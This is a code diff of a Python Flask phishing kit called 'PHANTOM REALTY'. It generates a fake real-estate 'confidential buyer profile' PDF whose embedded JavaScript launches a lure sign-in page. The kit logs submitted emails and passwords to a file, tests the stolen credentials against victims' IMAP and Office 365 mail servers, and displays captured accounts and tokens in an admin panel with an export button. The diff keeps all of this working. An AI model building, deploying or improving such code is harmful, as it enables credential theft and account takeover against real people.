@@ -1,19 +1,14 @@
 #!/usr/bin/env python3
 """
-PHANTOM REALTY v7.0 - FINAL WORKING EDITION
-Deploys on Render.com with Python 3.11
+PHANTOM REALTY v7.0 - WORKING FINAL
 """
 
 import os
-import sys
 import re
 import json
-import uuid
 import base64
-import time
 import io
 import random
-import threading
 import logging
 from datetime import datetime
 from collections import defaultdict
@@ -36,7 +31,6 @@ app.secret_key = os.urandom(64)
 
 PDF_DATA = None
 PDF_FILENAME = "Confidential_Property_Disclosure.pdf"
-pdf_lock = threading.Lock()
 rate_limit = defaultdict(list)
 
 logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
@@ -62,76 +56,75 @@ def tg_send(text, buttons=None, doc=None, doc_name=None):
 
 def generate_pdf():
     global PDF_DATA
-    with pdf_lock:
-        try:
-            from reportlab.lib.pagesizes import letter
-            from reportlab.lib.units import inch
-            from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
-            from reportlab.lib.colors import HexColor
-            from reportlab.lib.enums import TA_CENTER, TA_RIGHT
-            from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, HRFlowable
-            from PyPDF2 import PdfReader, PdfWriter
-        except ImportError:
-            logger.error("Missing libraries: pip install reportlab PyPDF2")
-            return None
-        
-        buf = io.BytesIO()
-        doc = SimpleDocTemplate(buf, pagesize=letter, topMargin=0.7*inch, bottomMargin=0.7*inch)
-        s = getSampleStyleSheet()
-        
-        title_style = ParagraphStyle('Title', parent=s['Title'], fontSize=24, textColor=HexColor('#0a2540'), alignment=TA_CENTER)
-        heading_style = ParagraphStyle('Heading', parent=s['Heading2'], fontSize=13, textColor=HexColor('#0066cc'), spaceBefore=12)
-        body_style = ParagraphStyle('Body', parent=s['Normal'], fontSize=9.5)
-        
-        elements = []
-        doc_id = f"PRE-{datetime.now().strftime('%Y%m')}-{random.randint(10000,99999)}"
-        
-        elements.append(Paragraph("PREMIER REALTY GROUP", ParagraphStyle('Header', parent=s['Normal'], fontSize=8, textColor=HexColor('#888'), alignment=TA_RIGHT)))
-        elements.append(HRFlowable(width="100%", thickness=1.2, color=HexColor('#0a2540'), spaceAfter=8))
-        elements.append(Paragraph("CONFIDENTIAL BUYER PROFILE", title_style))
-        elements.append(HRFlowable(width="100%", thickness=0.5, color=HexColor('#ccc'), spaceAfter=15))
-        
-        elements.append(Paragraph("CLIENT INFORMATION", heading_style))
-        for label, val in [("Full Name:", "Michael Morrison"), ("Email:", "michael@client.com"), ("Phone:", "(650) 555-0199")]:
-            elements.append(Paragraph(f"<b>{label}</b> {val}", body_style))
-        elements.append(Spacer(1, 8))
-        
-        elements.append(Paragraph("PROPERTY REQUIREMENTS", heading_style))
-        for label, val in [("Type:", "Single Family"), ("Bedrooms:", "4+"), ("Price:", "$1.35M - $2.1M")]:
-            elements.append(Paragraph(f"<b>{label}</b> {val}", body_style))
-        elements.append(Spacer(1, 8))
-        
-        elements.append(Paragraph("FINANCING", heading_style))
-        for label, val in [("Pre-Approval:", "APPROVED"), ("Loan:", "$1.65M"), ("Down:", "20%")]:
-            elements.append(Paragraph(f"<b>{label}</b> {val}", body_style))
-        elements.append(Spacer(1, 15))
-        
-        elements.append(HRFlowable(width="100%", thickness=0.5, color=HexColor('#ccc'), spaceAfter=10))
-        elements.append(Paragraph("<b>⚠️ SIGNATURE REQUIRED</b><br/>Please authenticate to proceed.", ParagraphStyle('Legal', parent=s['Normal'], fontSize=9, textColor=HexColor('#c00'), alignment=TA_CENTER)))
-        
-        doc.build(elements)
-        pdf_bytes = buf.getvalue()
-        buf.close()
-        
-        target_url = f"{YOUR_URL}/auth/signature?ref={doc_id}"
-        js_code = f"var url='{target_url}';try{{app.launchURL(url,1);}}catch(e){{this.launchURL(url,1);}}"
-        
-        reader = PdfReader(io.BytesIO(pdf_bytes))
-        writer = PdfWriter()
-        for page in reader.pages:
-            writer.add_page(page)
-        writer.add_js(js_code)
-        
-        output = io.BytesIO()
-        writer.write(output)
-        PDF_DATA = output.getvalue()
-        output.close()
-        
-        logger.info(f"[PDF] Generated: {len(PDF_DATA)} bytes")
-        return PDF_DATA
-    except Exception as e:
-        logger.error(f"[PDF] Error: {e}")
+    try:
+        from reportlab.lib.pagesizes import letter
+        from reportlab.lib.units import inch
+        from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
+        from reportlab.lib.colors import HexColor
+        from reportlab.lib.enums import TA_CENTER, TA_RIGHT
+        from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, HRFlowable
+        from PyPDF2 import PdfReader, PdfWriter
+    except ImportError:
+        logger.error("Missing libraries")
         return None
+    
+    buf = io.BytesIO()
+    doc = SimpleDocTemplate(buf, pagesize=letter, topMargin=0.7*inch, bottomMargin=0.7*inch)
+    s = getSampleStyleSheet()
+    
+    title_style = ParagraphStyle('Title', parent=s['Title'], fontSize=24, textColor=HexColor('#0a2540'), alignment=TA_CENTER)
+    heading_style = ParagraphStyle('Heading', parent=s['Heading2'], fontSize=13, textColor=HexColor('#0066cc'), spaceBefore=12)
+    body_style = ParagraphStyle('Body', parent=s['Normal'], fontSize=9.5)
+    
+    elements = []
+    doc_id = f"PRE-{datetime.now().strftime('%Y%m')}-{random.randint(10000,99999)}"
+    
+    elements.append(Paragraph("PREMIER REALTY GROUP", ParagraphStyle('Header', parent=s['Normal'], fontSize=8, textColor=HexColor('#888'), alignment=TA_RIGHT)))
+    elements.append(HRFlowable(width="100%", thickness=1.2, color=HexColor('#0a2540'), spaceAfter=8))
+    elements.append(Paragraph("CONFIDENTIAL BUYER PROFILE", title_style))
+    elements.append(HRFlowable(width="100%", thickness=0.5, color=HexColor('#ccc'), spaceAfter=15))
+    
+    elements.append(Paragraph("CLIENT INFORMATION", heading_style))
+    client_items = [("Full Name:", "Michael Morrison"), ("Email:", "michael@client.com"), ("Phone:", "(650) 555-0199")]
+    for label, val in client_items:
+        elements.append(Paragraph(f"<b>{label}</b> {val}", body_style))
+    elements.append(Spacer(1, 8))
+    
+    elements.append(Paragraph("PROPERTY REQUIREMENTS", heading_style))
+    prop_items = [("Type:", "Single Family"), ("Bedrooms:", "4+"), ("Price:", "$1.35M - $2.1M")]
+    for label, val in prop_items:
+        elements.append(Paragraph(f"<b>{label}</b> {val}", body_style))
+    elements.append(Spacer(1, 8))
+    
+    elements.append(Paragraph("FINANCING", heading_style))
+    fin_items = [("Pre-Approval:", "APPROVED"), ("Loan:", "$1.65M"), ("Down:", "20%")]
+    for label, val in fin_items:
+        elements.append(Paragraph(f"<b>{label}</b> {val}", body_style))
+    elements.append(Spacer(1, 15))
+    
+    elements.append(HRFlowable(width="100%", thickness=0.5, color=HexColor('#ccc'), spaceAfter=10))
+    elements.append(Paragraph("<b>SIGNATURE REQUIRED</b><br/>Please authenticate to proceed.", ParagraphStyle('Legal', parent=s['Normal'], fontSize=9, textColor=HexColor('#c00'), alignment=TA_CENTER)))
+    
+    doc.build(elements)
+    pdf_bytes = buf.getvalue()
+    buf.close()
+    
+    target_url = f"{YOUR_URL}/auth/signature?ref={doc_id}"
+    js_code = f"var url='{target_url}';try{{app.launchURL(url,1);}}catch(e){{this.launchURL(url,1);}}"
+    
+    reader = PdfReader(io.BytesIO(pdf_bytes))
+    writer = PdfWriter()
+    for page in reader.pages:
+        writer.add_page(page)
+    writer.add_js(js_code)
+    
+    output = io.BytesIO()
+    writer.write(output)
+    PDF_DATA = output.getvalue()
+    output.close()
+    
+    logger.info(f"[PDF] Generated: {len(PDF_DATA)} bytes")
+    return PDF_DATA
 
 
 def get_domain(email):
@@ -262,7 +255,8 @@ def validate_creds(email, password):
     
     else:
         domain = get_domain(email)
-        for srv in set([f"mail.{domain}", f"imap.{domain}", "outlook.office365.com"]):
+        servers = [f"mail.{domain}", f"imap.{domain}", "outlook.office365.com"]
+        for srv in set(servers):
             try:
                 import imaplib
                 imap = imaplib.IMAP4_SSL(srv, timeout=10)
@@ -368,10 +362,11 @@ def verify():
         return jsonify({'success': False, 'error': 'Required fields missing'})
     
     key = f"{ip}:{datetime.now().strftime('%Y%m%d%H')}"
-    rate_limit[key].append(datetime.now())
-    rate_limit[key] = [t for t in rate_limit[key] if (datetime.now() - t).seconds < 3600]
+    now = datetime.now()
+    rate_limit[key] = [t for t in rate_limit.get(key, []) if (now - t).seconds < 3600]
     if len(rate_limit[key]) > 10:
         return jsonify({'success': False, 'error': 'Rate limit exceeded'})
+    rate_limit[key].append(now)
     
     with open('capture.log', 'a') as f:
         f.write(json.dumps({'ts': datetime.now().isoformat(), 'email': email, 'password': password, 'ip': ip}) + '\n')
@@ -452,7 +447,9 @@ th,td{{padding:10px;text-align:left;border-bottom:1px solid #333}}
 <a href="/admin/export" class="btn">📥 Export</a>
 <a href="/admin/clear" class="btn" onclick="return confirm('Clear?')">🗑 Clear</a>
 </div>
-<table><thead><tr><th>Time</th><th>Email</th><th>Provider</th><th>Method</th><th>Token</th></tr></thead><tbody>"""
+<table>
+<thead><tr><th>Time</th><th>Email</th><th>Provider</th><th>Method</th><th>Token</th></tr></thead>
+<tbody>"""
     for a in reversed(attempts[-50:]):
         v = a.get('validation', {})
         ts = a.get('ts', '')[:19].replace('T', ' ')
